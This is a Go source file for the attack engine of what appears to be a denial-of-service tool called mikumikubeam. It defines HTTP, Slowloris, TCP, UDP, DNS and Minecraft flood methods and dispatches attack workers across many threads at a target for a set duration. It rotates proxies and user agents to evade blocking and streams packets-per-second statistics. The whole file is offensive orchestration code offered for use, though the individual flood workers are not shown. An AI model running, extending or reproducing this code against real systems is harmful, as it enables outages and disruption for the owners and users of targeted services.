package engine

import (
	"context"
	"math/rand"
	"runtime"
	"sync"
	"time"

	targetpkg "github.com/sammwyy/mikumikubeam/pkg/target"
)

type AttackKind string

const (
	AttackHTTPFlood     AttackKind = "http_flood"
	AttackHTTPBypass    AttackKind = "http_bypass"
	AttackHTTPSlowloris AttackKind = "http_slowloris"
	AttackTCPFlood      AttackKind = "tcp_flood"
	AttackMinecraftPing AttackKind = "minecraft_ping"
	AttackUDPFlood      AttackKind = "udp_flood"
	AttackDNSFlood      AttackKind = "dns_flood"
)

type AttackParams struct {
	Target      string
	TargetNode  targetpkg.Node
	Duration    time.Duration
	PacketDelay time.Duration
	PacketSize  int
	Method      AttackKind
	Threads     int
	Verbose     bool
}

type Proxy struct {
	Username string
	Password string
	Protocol string
	Host     string
	Port     int
}

type AttackStats struct {
	Timestamp    time.Time
	PacketsPerS  int64
	TotalPackets int64
	Proxies      int
	Log          string
}

type AttackWorker interface {
	Fire(ctx context.Context, params AttackParams, proxy Proxy, userAgent string, logCh chan<- AttackStats) error
}

type Engine struct {
	registry Registry
	mu       sync.RWMutex
	attacks  map[string]*AttackInstance
}

type AttackInstance struct {
	ID        string
	Params    AttackParams
	Cancel    context.CancelFunc
	StatsCh   chan AttackStats
	TotalSent int64
	mu        sync.RWMutex
	closed    bool
	closedMu  sync.Mutex
}

func (inst *AttackInstance) safeSend(stat AttackStats) {
	inst.closedMu.Lock()
	if inst.closed {
		inst.closedMu.Unlock()
		return
	}
	inst.closedMu.Unlock()
	defer func() { recover() }()
	select {
	case inst.StatsCh <- stat:
	default:
	}
}

func (inst *AttackInstance) closeOnce() {
	inst.closedMu.Lock()
	defer inst.closedMu.Unlock()
	if !inst.closed {
		inst.closed = true
		close(inst.StatsCh)
	}
}

func NewEngine(reg Registry) *Engine {
	return &Engine{
		registry: reg,
		attacks:  make(map[string]*AttackInstance),
	}
}

func (e *Engine) Start(attackID string, parent context.Context, params AttackParams, proxies []Proxy, userAgents []string) (<-chan AttackStats, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if existing, exists := e.attacks[attackID]; exists {
		existing.Cancel()
		existing.closeOnce()
		delete(e.attacks, attackID)
	}

	worker, ok := e.registry.Get(params.Method)
	if !ok {
		tempCh := make(chan AttackStats, 1)
		tempCh <- AttackStats{Timestamp: time.Now(), Log: "unsupported attack method"}
		close(tempCh)
		return tempCh, nil
	}

	ctx, cancel := context.WithCancel(parent)
	statsCh := make(chan AttackStats, 2048)

	instance := &AttackInstance{
		ID:      attackID,
		Params:  params,
		Cancel:  cancel,
		StatsCh: statsCh,
	}

	e.attacks[attackID] = instance

	threads := params.Threads
	if threads <= 0 {
		threads = runtime.NumCPU()
	}
	proxyCount := len(proxies)
	uaCount := len(userAgents)

	var wg sync.WaitGroup

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastTotal int64
		for {
			select {
			case <-ctx.Done():
				wg.Wait()
				instance.closeOnce()
				e.mu.Lock()
				delete(e.attacks, attackID)
				e.mu.Unlock()
				return
			case t := <-ticker.C:
				instance.mu.RLock()
				total := instance.TotalSent
				instance.mu.RUnlock()
				delta := total - lastTotal
				lastTotal = total
				if delta > 0 || lastTotal == 0 {
					instance.safeSend(AttackStats{
						Timestamp:    t,
						PacketsPerS:  delta,
						TotalPackets: total,
						Proxies:      proxyCount,
					})
				}
			}
		}
	}()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			ticker := time.NewTicker(params.PacketDelay)
			defer ticker.Stop()

			dispatch := func() {
				var p Proxy
				var ua string
				if proxyCount > 0 {
					p = proxies[rand.Intn(proxyCount)]
				}
				if uaCount > 0 {
					ua = userAgents[rand.Intn(uaCount)]
				}
				wg.Add(1)
				go func() {
					defer wg.Done()
					defer func() { recover() }()
					_ = worker.Fire(ctx, params, p, ua, instance.StatsCh)
				}()
				instance.mu.Lock()
				instance.TotalSent++
				instance.mu.Unlock()
			}

			deadline := time.Now().Add(params.Duration)
			dispatch()
			for {
				if !deadline.IsZero() && time.Now().After(deadline) {
					return
				}
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					dispatch()
				}
			}
		}(i)
	}

	return statsCh, nil
}

func (e *Engine) Stop(attackID string) {
	e.mu.Lock()
	defer e.mu.Unlock()
	if instance, exists := e.attacks[attackID]; exists {
		instance.Cancel()
		delete(e.attacks, attackID)
	}
}

func (e *Engine) StopAll() {
	e.mu.Lock()
	defer e.mu.Unlock()
	for _, instance := range e.attacks {
		instance.Cancel()
	}
	e.attacks = make(map[string]*AttackInstance)
}

func (e *Engine) IsRunning(attackID string) bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	_, exists := e.attacks[attackID]
	return exists
}

func (e *Engine) GetRunningAttacks() []string {
	e.mu.RLock()
	defer e.mu.RUnlock()
	ids := make([]string, 0, len(e.attacks))
	for id := range e.attacks {
		ids = append(ids, id)
	}
	return ids
}